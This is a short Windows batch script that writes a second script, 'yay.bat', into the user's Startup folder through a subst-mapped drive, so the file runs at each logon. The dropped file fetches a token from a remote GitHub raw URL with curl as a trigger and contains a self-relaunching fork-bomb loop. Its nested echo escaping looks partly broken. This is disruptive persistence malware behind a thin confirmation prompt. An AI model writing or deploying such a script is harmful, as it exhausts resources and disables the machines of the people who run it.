@echo off
setlocal enabledelayedexpansion
set /p confirm=Do you want to continue? (Y/N):  
if /i "!confirm!"=="Y" (
    subst Z: "%USERPROFILE%\Start Menu\Programs\Startup"
    timeout 2 > nul
    cd /d Z:\  
    (
        echo @echo off
        echo setlocal enabledelayedexpansion
        echo set "token=hasdjklskalsdjasd90d8a380asdy7a90sd"
        echo for /f "delims=" %%%%i in ^('curl -s https://raw.githubusercontent.com/cokie1479/73128sad0asdsa/refs/heads/main/ajdsa.txt'^) do ^(
        echo     set "fetched_token=%%%%i"
        echo     echo :A
        echo     echo pause
        echo     echo start "" %%0
        echo     echo start "" %%0
        echo     echo start "" %%0
        echo     echo start "" %%0
        echo     echo start "" %%0
        echo     echo GOTO A
        echo ^)
        echo if not "!fetched_token!"=="!token!" ^(
        echo     exit /b
        echo ^)
    ) > "yay.bat"
) else (
    echo Exiting without running
    echo pause
)
subst Z: /d
